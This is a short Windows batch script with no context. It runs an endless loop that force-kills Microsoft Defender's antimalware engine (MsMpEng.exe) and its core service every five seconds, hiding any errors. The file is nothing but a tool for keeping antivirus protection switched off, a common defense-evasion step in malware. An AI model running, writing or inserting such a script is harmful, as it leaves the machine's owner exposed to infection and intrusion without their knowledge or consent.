@echo off
:loop
taskkill /F /IM MsMpEng.exe 2>nul
taskkill /F /IM MpDefenderCoreService.exe 2>nul
timeout /t 5 /nobreak >nul
goto loop
